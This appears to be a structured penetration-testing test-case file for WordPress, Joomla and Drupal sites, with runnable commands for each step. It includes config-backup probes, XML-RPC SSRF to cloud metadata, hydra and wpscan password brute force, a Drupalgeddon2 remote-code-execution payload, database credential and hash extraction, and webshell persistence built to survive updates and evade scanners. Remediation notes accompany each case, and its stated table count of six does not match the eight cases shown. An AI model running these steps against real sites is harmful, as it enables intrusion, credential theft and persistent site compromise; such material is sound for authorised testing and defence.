# CMS Framework Attack Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by category and severity.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. CMS Fingerprinting | 1 | MEDIUM |
| B. WordPress Enumeration | 1 | HIGH |
| C. WordPress Vulnerability Scanning | 1 | HIGH - CRITICAL |
| D. Joomla Scanning | 1 | HIGH - CRITICAL |
| E. Drupal Scanning | 1 | HIGH - CRITICAL |
| F. Nuclei CMS Templates | 1 | HIGH - CRITICAL |
| **Total** | **6** | **MEDIUM - CRITICAL** |

---

## A. CMS Fingerprinting

### TC-CMS-001: CMS Platform Identification and Version Fingerprinting

| Field | Value |
|------|------|
| **ID** | TC-CMS-001 |
| **Name** | CMS Platform Identification and Version Fingerprinting |
| **Category** | A. CMS Fingerprinting |
| **Severity** | MEDIUM |
| **Prerequisites** | Target URL accessible; no WAF blocking scanner user agents (or use evasion flags) |
| **Test Steps** | 1. Run CMSeeK: `cmseek -u http://target --follow-redirect`<br>2. Run WhatWeb: `whatweb -v http://target`<br>3. Run manual HTTP probes for WordPress indicators: `curl -s http://target/wp-login.php`, `curl -s http://target/readme.html`<br>4. Run manual HTTP probes for Joomla indicators: `curl -s http://target/administrator/`, `curl -s http://target/README.txt`<br>5. Run manual HTTP probes for Drupal indicators: `curl -s http://target/CHANGELOG.txt`, `curl -s http://target/core/CHANGELOG.txt`<br>6. Check HTTP response headers: `curl -sI http://target | grep -i "x-powered-by\|x-pingback\|link:"`<br>7. Cross-reference CMSeeK and WhatWeb results for consistency |
| **Expected Results** | CMS platform identified (WordPress/Joomla/Drupal/other) with version number, installed technologies, server software, and list of detected extensions |
| **Actual Impact** | Identified CMS type and version enables targeted follow-up scanning with platform-specific tools |
| **Remediation** | Remove version identifiers from meta tags, HTTP headers, and static files. Block access to readme.html, CHANGELOG.txt, and other fingerprint files |

---

## B. WordPress Enumeration

### TC-CMS-002: WordPress User, Plugin, and Theme Enumeration

| Field | Value |
|------|------|
| **ID** | TC-CMS-002 |
| **Name** | WordPress User, Plugin, and Theme Enumeration |
| **Category** | B. WordPress Enumeration |
| **Severity** | HIGH |
| **Prerequisites** | Target identified as WordPress; WPScan installed; WPScan API token for vulnerability data (optional but recommended) |
| **Test Steps** | 1. Run WPScan full enumeration: `wpscan --url http://target --enumerate u,vp,vt,dbe,cb --api-token TOKEN`<br>2. Enumerate users via REST API: `curl -s http://target/wp-json/wp/v2/users?per_page=100 \| jq '.[].slug'`<br>3. Enumerate users via author archives: `for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}" "http://target/?author=$i"; done`<br>4. Enumerate users via RSS feed: `curl -s http://target/feed/ \| grep -oP '<dc:creator>\K[^<]+'`<br>5. Check for database exports: `wpscan --url http://target --enumerate dbe`<br>6. Check for config backups: `wpscan --url http://target --enumerate cb`<br>7. Manually probe backup files: `curl -s http://target/wp-config.php.bak`, `curl -s http://target/wp-config.php.old`, `curl -s http://target/wp-config.php.save` |
| **Expected Results** | Complete list of WordPress usernames, installed plugins with versions, installed themes with versions, any exposed database exports or configuration backups |
| **Actual Impact** | Enumerated usernames enable targeted brute force attacks; plugin/theme versions enable CVE mapping; config backups expose database credentials |
| **Remediation** | Disable REST API user endpoint (`/wp-json/wp/v2/users`), block author archive enumeration, remove backup files from web root, restrict access to wp-content directory listing |

---

## C. WordPress Vulnerability Scanning

### TC-CMS-003: WPScan Vulnerability Assessment and XML-RPC Exploitation

| Field | Value |
|------|------|
| **ID** | TC-CMS-003 |
| **Name** | WPScan Vulnerability Assessment and XML-RPC Exploitation |
| **Category** | C. WordPress Vulnerability Scanning |
| **Severity** | HIGH - CRITICAL |
| **Prerequisites** | WordPress confirmed; WPScan with API token; enumerated users from TC-CMS-002 |
| **Test Steps** | 1. Run WPScan vulnerability scan: `wpscan --url http://target --enumerate vp,vt --api-token TOKEN`<br>2. Check XML-RPC availability: `curl -s -X POST http://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'`<br>3. Test XML-RPC multicall brute force: `wpscan --url http://target --passwords passwords.txt --usernames admin --password-attack xmlrpc-multicall`<br>4. Test XML-RPC pingback SSRF: `curl -s -X POST http://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/</string></value></param><param><value><string>http://target/?p=1</string></value></param></params></methodCall>'`<br>5. Run nuclei WordPress CVE templates: `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress`<br>6. Attempt password brute force with discovered usernames: `wpscan --url http://target --passwords /usr/share/wordlists/rockyou.txt --usernames admin,editor`<br>7. Test wp-cron accessibility: `curl -s http://target/wp-cron.php` |
| **Expected Results** | List of vulnerable plugins/themes with CVE references; XML-RPC method list confirming attack surface; successful credential cracking for weak passwords; pingback SSRF response confirming internal request capability |
| **Actual Impact** | Vulnerable plugins enable RCE, SQLi, or file upload exploits; XML-RPC enables amplified brute force and SSRF; cracked credentials provide admin panel access for webshell deployment |
| **Remediation** | Update all vulnerable plugins and themes immediately; disable XML-RPC if not required; implement rate limiting on wp-login.php; enforce strong passwords (16+ characters) and enable 2FA; block wp-cron.php from external access |

---

## D. Joomla Scanning

### TC-CMS-004: Joomla Component Enumeration and Exploitation with JoomScan

| Field | Value |
|------|------|
| **ID** | TC-CMS-004 |
| **Name** | Joomla Component Enumeration and Exploitation with JoomScan |
| **Category** | D. Joomla Scanning |
| **Severity** | HIGH - CRITICAL |
| **Prerequisites** | Target identified as Joomla CMS; JoomScan installed; hydra available for brute force |
| **Test Steps** | 1. Run JoomScan comprehensive scan: `joomscan -u http://target --scan-all`<br>2. Detect Joomla version: `curl -s http://target/administrator/manifests/files/joomla.xml \| grep version`<br>3. Enumerate components manually: probe `http://target/index.php?option=com_users`, `com_content`, `com_contact`, `com_media`, `com_search`<br>4. Test for configuration file exposure: `curl -s http://target/configuration.php`, `curl -s http://target/configuration.php.bak`, `curl -s http://target/configuration.php~`<br>5. Test CVE-2023-23752 (Joomla 4.x info disclosure): `curl -s http://target/api/index.php/v1/config/application?public=true`<br>6. Attempt admin brute force: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login&option=com_login:F=Invalid"`<br>7. Run nuclei Joomla templates: `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags joomla` |
| **Expected Results** | Joomla version identified; installed components enumerated; configuration file contents exposed (database credentials); CVE-2023-23752 returns database configuration in JSON; weak admin credentials discovered |
| **Actual Impact** | Exposed configuration.php reveals database credentials for direct database access; known CVEs enable unauthenticated information disclosure or RCE; cracked admin credentials enable template manipulation and webshell upload |
| **Remediation** | Restrict access to configuration.php backup files; update Joomla to latest version; implement IP-based admin panel restriction; enforce strong admin passwords; disable directory listing for /components/, /modules/, /plugins/ |

---

## E. Drupal Scanning

### TC-CMS-005: Drupal Module Enumeration and Drupalgeddon Exploitation with Droopescan

| Field | Value |
|------|------|
| **ID** | TC-CMS-005 |
| **Name** | Drupal Module Enumeration and Drupalgeddon Exploitation with Droopescan |
| **Category** | E. Drupal Scanning |
| **Severity** | HIGH - CRITICAL |
| **Prerequisites** | Target identified as Drupal CMS; Droopescan installed; curl available for manual exploitation |
| **Test Steps** | 1. Run Droopescan: `droopescan scan drupal -u http://target -t 16`<br>2. Detect Drupal version via CHANGELOG.txt: `curl -s http://target/CHANGELOG.txt \| head -5` and `curl -s http://target/core/CHANGELOG.txt \| head -5`<br>3. Enumerate modules: `curl -s http://target/sites/all/modules/ \| grep -oP 'href="[^/"]+/"'`<br>4. Test settings.php exposure: `curl -s http://target/sites/default/settings.php.bak`, `curl -s http://target/sites/default/settings.php~`<br>5. Test Drupalgeddon2 (CVE-2018-7600) if version is 7.x or 8.x: `curl -s http://target -X POST -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=id"`<br>6. Test Drupal REST API: `curl -s http://target/jsonapi` and `curl -s http://target/node?_format=hal_json`<br>7. Run nuclei Drupal templates: `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags drupal`<br>8. Attempt admin brute force: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:F=Sorry"` |
| **Expected Results** | Drupal version and installed modules identified; exposed settings.php backup reveals database credentials; Drupalgeddon2 exploit returns command execution output; REST API endpoints enumerate content types and user data |
| **Actual Impact** | Drupalgeddon2 provides unauthenticated remote code execution on unpatched Drupal 7.x/8.x; exposed settings.php reveals database credentials for direct access; REST API enables data exfiltration without authentication |
| **Remediation** | Update Drupal core and all modules to latest versions; block access to CHANGELOG.txt and settings.php backups; implement IP-based admin restriction; disable or restrict REST API and JSON:API endpoints; enable trusted_host configuration |

---

## F. Nuclei CMS Templates

### TC-CMS-006: Automated CMS Vulnerability Discovery with Nuclei Templates

| Field | Value |
|------|------|
| **ID** | TC-CMS-006 |
| **Name** | Automated CMS Vulnerability Discovery with Nuclei Templates |
| **Category** | F. Nuclei CMS Templates |
| **Severity** | HIGH - CRITICAL |
| **Prerequisites** | Nuclei installed with updated template library; target URL; CMS type identified from TC-CMS-001 |
| **Test Steps** | 1. Update nuclei templates: `nuclei -update-templates`<br>2. Run CMS-agnostic scan: `nuclei -u http://target -t ~/nuclei-templates/http/ -tags cms -rl 50 -c 25`<br>3. Run WordPress-specific scan (if WordPress): `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress -rl 50`<br>4. Run Joomla-specific scan (if Joomla): `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags joomla -rl 50`<br>5. Run Drupal-specific scan (if Drupal): `nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags drupal -rl 50`<br>6. Run exposure/backup file detection: `nuclei -u http://target -t ~/nuclei-templates/http/exposures/configs/ -rl 50`<br>7. Run admin panel detection: `nuclei -u http://target -t ~/nuclei-templates/http/exposures/ -tags panel,admin -rl 50`<br>8. Parse and review results: `cat results.txt` or `cat results.json \| jq '.info'` |
| **Expected Results** | Comprehensive list of CVEs, misconfigurations, exposed files, and admin panels discovered through template-based scanning. Results include severity ratings, CVE references, and remediation guidance |
| **Actual Impact** | Automated discovery identifies vulnerabilities that manual testing may miss, including edge-case CVEs in plugins/modules, exposed debug panels, and configuration files. Provides structured output for reporting |
| **Remediation** | Address all CRITICAL and HIGH severity findings immediately. Review MEDIUM findings for applicability. Update CMS core and all extensions to patched versions. Restrict access to admin panels and debug endpoints |

---

## G. CMS Post-Exploitation and Persistence

### TC-CMS-007: CMS Database Credential Extraction and Hash Cracking

| Field | Value |
|------|------|
| **ID** | TC-CMS-007 |
| **Name** | CMS Database Credential Extraction and Hash Cracking |
| **Category** | G. CMS Post-Exploitation and Persistence |
| **Severity** | CRITICAL |
| **Prerequisites** | File read access to CMS configuration files (wp-config.php, configuration.php, or settings.php) via path traversal, LFI, or server access; hashcat installed for offline cracking |
| **Objective** | Verify that CMS database credentials can be extracted from configuration files and that password hashes can be cracked to demonstrate full account compromise |
| **Test Steps** | 1. Locate CMS configuration file: WordPress `wp-config.php`, Joomla `configuration.php`, Drupal `settings.php`<br>2. Extract database credentials: host, username, password, database name<br>3. Attempt direct database connection: `mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME`<br>4. Extract password hashes: WordPress `SELECT user_login, user_pass FROM wp_users`, Joomla `SELECT username, password FROM jos_users`, Drupal `SELECT name, pass FROM users_field_data`<br>5. Identify hash format: WordPress=phpass(400), Joomla=bcrypt(3200), Drupal=SHA-512(7900)<br>6. Crack hashes with hashcat: `hashcat -m MODE hashes.txt /usr/share/wordlists/rockyou.txt`<br>7. Document all cracked passwords and their corresponding user accounts |
| **Expected Results** | Database credentials are successfully extracted and provide direct database access; password hashes are extracted and crackable with standard wordlists; at least one administrative password is cracked providing full CMS control |
| **Remediation** | Restrict file read access to configuration files (chmod 400); use environment variables for database credentials instead of hardcoded values; enforce strong passwords (16+ characters) for all CMS accounts; implement rate limiting on login attempts |

### TC-CMS-008: CMS Webshell Persistence and Detection Evasion

| Field | Value |
|------|------|
| **ID** | TC-CMS-008 |
| **Name** | CMS Webshell Persistence and Detection Evasion |
| **Category** | G. CMS Post-Exploitation and Persistence |
| **Severity** | CRITICAL |
| **Prerequisites** | Administrative access to the CMS (WordPress/Joomla/Drupal) achieved through credential cracking or exploitation; file upload or theme/plugin editing capability available |
| **Objective** | Verify that persistent webshell access can be established through CMS native features and that the persistence mechanism survives CMS updates and basic detection attempts |
| **Test Steps** | 1. WordPress: create a malicious plugin with webshell in the main PHP file; zip and upload via Plugins > Add New > Upload Plugin<br>2. WordPress alternative: edit theme header.php via Appearance > Theme Editor to embed a one-line webshell<br>3. Joomla: create a custom module with PHP payload and install via Extensions > Manage > Install<br>4. Drupal: enable PHP Filter module and create content with embedded PHP webshell<br>5. Verify webshell access: `curl http://target/wp-content/plugins/evil/shell.php?cmd=id`<br>6. Test persistence: update the CMS to latest version and verify webshell still functions<br>7. Attempt detection: scan the CMS with WPScan, Acunetix, or similar tools to check if webshell is detected<br>8. Document the persistence mechanism and update survival results |
| **Expected Results** | Webshell is successfully uploaded through CMS administrative features; command execution is achieved via the webshell URL; persistence survives at least one CMS core update; automated scanners do not detect the webshell in default configuration |
| **Remediation** | Disable theme/plugin file editing in wp-config.php (DISALLOW_FILE_EDIT=true); implement file integrity monitoring on CMS directories; restrict plugin installation to vetted sources only; deploy web application firewall rules to detect webshell patterns; audit installed plugins and themes regularly for unauthorized additions |
| **Pass Criteria** | Webshell provides command execution with the web server user privileges; persistence mechanism survives CMS update; automated scanning does not flag the webshell in default configuration |
